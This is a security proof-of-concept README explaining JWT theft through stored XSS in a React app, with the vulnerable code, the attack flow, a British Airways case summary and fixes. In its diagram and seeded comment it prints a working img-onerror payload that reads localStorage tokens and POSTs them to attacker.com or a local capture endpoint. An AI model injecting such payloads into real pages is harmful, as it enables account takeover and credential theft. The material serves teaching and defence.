# JWT Token Theft via XSS — Security POC

> A proof-of-concept demonstrating how storing JWT tokens in `localStorage`
> combined with an XSS vulnerability leads to full account takeover.
> Inspired by the 2018 British Airways breach.

---

## Table of Contents

1. [Background Concepts](#1-background-concepts)
2. [The Two Vulnerabilities](#2-the-two-vulnerabilities)
3. [How the Attack Works](#3-how-the-attack-works)
4. [Vulnerable Code — Line by Line](#4-vulnerable-code--line-by-line)
5. [What the Attacker Gets](#5-what-the-attacker-gets)
6. [Real World — British Airways 2018](#6-real-world--british-airways-2018)
7. [The Fix](#7-the-fix)
8. [Running the POC](#8-running-the-poc)

---

## 1. Background Concepts

### What is a JWT?

A **JSON Web Token** is a string the server gives you after you log in.
It proves your identity on every future request — like a wristband at an event.

```
eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VybmFtZSI6ImFsaWNlIn0  .  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
      HEADER                        PAYLOAD                          SIGNATURE
```

Decoded payload (middle part, just base64):
```json
{
  "sub": 1,
  "username": "alice",
  "role": "user",
  "iat": 1715000000,
  "exp": 1715003600
}
```

The server signs it with a secret key. Anyone who has this token can call
the API **as alice** — no password needed.

---

### What is localStorage?

`localStorage` is a key-value store **inside the browser**, per domain.

```js
localStorage.setItem('jwt_token', token)  // save
localStorage.getItem('jwt_token')         // read — anyone on this page can do this
```

**Key rule:** Any JavaScript running on `http://localhost:5173` can read
everything in that domain's `localStorage`. There is no access control.

---

### What is XSS (Cross-Site Scripting)?

XSS happens when an attacker's JavaScript gets executed inside your app.

This happens when user-supplied text is **rendered as HTML** instead of
being treated as plain text.

```
User types:  <img src="x" onerror="alert('hacked')">
App renders: actual <img> tag → onerror fires → JavaScript runs
```

Two types matter here:

| Type | How it works |
|---|---|
| **Stored XSS** | Payload saved to DB, fires for every user who loads the page |
| **Reflected XSS** | Payload in a URL, fires only when the victim clicks the link |

This POC uses **Stored XSS** — the most dangerous kind.

---

## 2. The Two Vulnerabilities

This attack needs **both** vulnerabilities to be present at the same time.

```
Vulnerability 1                    Vulnerability 2
─────────────────                  ─────────────────
JWT stored in localStorage    +    XSS in the comments section
(token is readable by JS)          (attacker JS runs on your page)
         │                                  │
         └──────────────┬───────────────────┘
                        ▼
               Token stolen + account hijacked
```

If only one exists:
- **XSS without localStorage token** → attacker runs JS but can't steal a token
  (if token is in `httpOnly` cookie, JS is blind to it)
- **localStorage token without XSS** → token is there but attacker has no way
  to execute code on your page to read it

---

## 3. How the Attack Works

### Step-by-step

```
┌─────────────────────────────────────────────────────────────────────────┐
│  VICTIM                                                                  │
│                                                                          │
│  1. Logs in → Server returns JWT                                         │
│                                                                          │
│  2. App stores it:                                                       │
│     localStorage.setItem('jwt_token', 'eyJhbGci...')                    │
│                                                                          │
│  3. Victim opens Dashboard → app fetches comments from DB                │
│                                                                          │
│  4. One comment contains:                                                │
│     <img src="x" onerror="                                               │
│       const token = localStorage.getItem('jwt_token');                  │
│       fetch('http://attacker.com/steal', {                               │
│         method: 'POST',                                                  │
│         body: JSON.stringify({ token })                                  │
│       });                                                                │
│     "/>                                                                  │
│                                                                          │
│  5. Browser renders this as HTML → img fails → onerror fires             │
│     → token is sent to attacker's server silently                        │
│                                                                          │
└──────────────────────────────────────────┬──────────────────────────────┘
                                           │  POST /steal  { token: "eyJ..." }
                                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  ATTACKER                                                                │
│                                                                          │
│  6. Receives the JWT                                                     │
│                                                                          │
│  7. Calls:                                                               │
│     GET /api/profile                                                     │
│     Authorization: Bearer eyJhbGci...                                   │
│                                                                          │
│  8. Server responds with alice's data — no password, no 2FA needed      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Vulnerable Code — Line by Line

### Vulnerability 1 — Token written to localStorage

**File:** `frontend/src/App.jsx`

```js
function handleLogin(token, userData) {
  // ❌ VULNERABLE: any JS on this page can now read the token
  localStorage.setItem('jwt_token', token)
  localStorage.setItem('jwt_user', JSON.stringify(userData))
}
```

Why it's wrong: `localStorage` has no `httpOnly` equivalent. There is no way
to tell the browser "store this but hide it from JavaScript."

---

### Vulnerability 2 — Comment rendered as raw HTML

**File:** `frontend/src/Dashboard.jsx`

```jsx
// ❌ VULNERABLE: pastes raw user content into the DOM as HTML
<div dangerouslySetInnerHTML={{ __html: comment.text }} />
```

React named this prop `dangerouslySetInnerHTML` as a warning.
The moment a comment contains `<script>` or `<img onerror=...>`,
that code runs with full page access.

---

### The malicious comment — pre-seeded in the database

**File:** `backend/server.js`

```js
{
  id: 2,
  author: "attacker",
  text: `<img src="x" onerror="
    const token = localStorage.getItem('jwt_token');
    fetch('http://localhost:3001/api/attacker/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, source: 'stored-xss', page: location.href })
    });
  " />`,
  safe: false
}
```

This is saved in the database. Every user who loads the Dashboard page
executes this code automatically.

---

### Attacker capture endpoint

**File:** `backend/server.js`

```js
// Simulates the attacker's external server
app.post('/api/attacker/capture', (req, res) => {
  const entry = { ...req.body, capturedAt: new Date().toISOString() }
  capturedTokens.push(entry)   // ← `capturedTokens` array stores stolen tokens
  console.log('Token captured:', entry)
  res.json({ ok: true })
})

app.get('/api/attacker/log', (req, res) => res.json(capturedTokens))
```

`capturedTokens` (line 95 of server.js) is the in-memory store that holds
every stolen token. In a real attack this would be a database on the
attacker's own server on a different domain.

---

## 5. What the Attacker Gets

After capturing the token the attacker can:

| Action | How | Impact |
|---|---|---|
| Read account data | `GET /api/profile` with stolen token | PII, account balance, sensitive info |
| Act as the user | Any authenticated API call | Place orders, change email, transfer funds |
| Stay logged in | Token is valid for its full lifetime (1 hour here) | Persistent access even after victim changes page |
| Offline decode | Base64-decode the payload | Know username, role, user ID without calling the API |

The server **cannot tell the difference** between the real user and
the attacker. The token is cryptographically valid.

---

## 6. Real World — British Airways 2018

| Detail | What happened |
|---|---|
| **Attack type** | Magecart / supply-chain XSS |
| **Entry point** | Attackers compromised a third-party JS library (Feedify) loaded on ba.com |
| **Payload** | ~22 lines of JS injected into the checkout page |
| **What was stolen** | Payment card details, names, addresses, login credentials, session tokens |
| **Exfiltration target** | `baways.com` — a lookalike domain registered by the attackers |
| **Duration** | 15 days undetected (21 Aug – 5 Sep 2018) |
| **Victims** | ~500,000 customers |
| **Fine** | £20,000,000 (ICO, under GDPR Article 32) |

**Key lesson:** The attack did not require breaking the server.
The vulnerability was entirely client-side. One compromised third-party
script had full access to everything JavaScript could touch on that page —
including tokens in `localStorage`.

---

## 7. The Fix

### Fix 1 — Stop storing tokens in localStorage

Use an `httpOnly` cookie instead. The browser sends it automatically,
but **no JavaScript can ever read it** — not your code, not injected code.

```js
// Server sets the cookie on login
res.cookie('token', jwtToken, {
  httpOnly: true,   // ← JS cannot access this at all
  secure: true,     // ← HTTPS only
  sameSite: 'Strict' // ← blocks CSRF
})
```

```js
// Client just calls the API — cookie is sent automatically
fetch('/api/profile', { credentials: 'include' })
// No need to read or attach the token manually
```

---

### Fix 2 — Sanitize HTML before rendering

Never render raw user input as HTML. Use a sanitization library:

```js
import DOMPurify from 'dompurify'

// Safe: strips all event handlers and dangerous tags
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.text) }} />

// Better: treat it as plain text — no HTML at all
<div>{comment.text}</div>
```

---

### Fix 3 — Content Security Policy (CSP)

A `Content-Security-Policy` HTTP header tells the browser to block
any script that isn't from your own server.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Even if XSS runs, `fetch()` to an external domain is blocked by the browser.

---

### Defence-in-depth — all three together

```
Attack step               Blocked by
────────────────────────  ──────────────────────────────────────
XSS injects script        CSP blocks inline scripts
XSS reads token           httpOnly cookie — JS cannot see it
XSS exfiltrates data      CSP blocks fetch to external domains
Attacker replays token    Short token lifetime + token rotation
```

No single fix is enough. All three together make the attack impossible.

---

## 8. Running the POC

### Prerequisites
- Node.js 22.12+ (installed via `nvm install 22`)

### Start

```bash
# Terminal 1 — backend
cd backend
npm install
node server.js
# → http://localhost:3001

# Terminal 2 — frontend
cd frontend
npm install
npm run dev
# → http://localhost:5173
```

### Demo walkthrough

| Step | Action |
|---|---|
| 1 | Open `http://localhost:5173` |
| 2 | Login as `alice / password123` |
| 3 | Go to **Dashboard** — XSS fires silently on page load |
| 4 | Go to **Attacker View** — see the captured token |
| 5 | Click **Replay → GET /api/profile** — full account access with no password |

### Test credentials

| Username | Password | Role |
|---|---|---|
| alice | password123 | user |
| admin | admin123 | admin |

---

> **This POC is for educational and security research purposes only.**
> All servers run locally. No real credentials or user data are used.
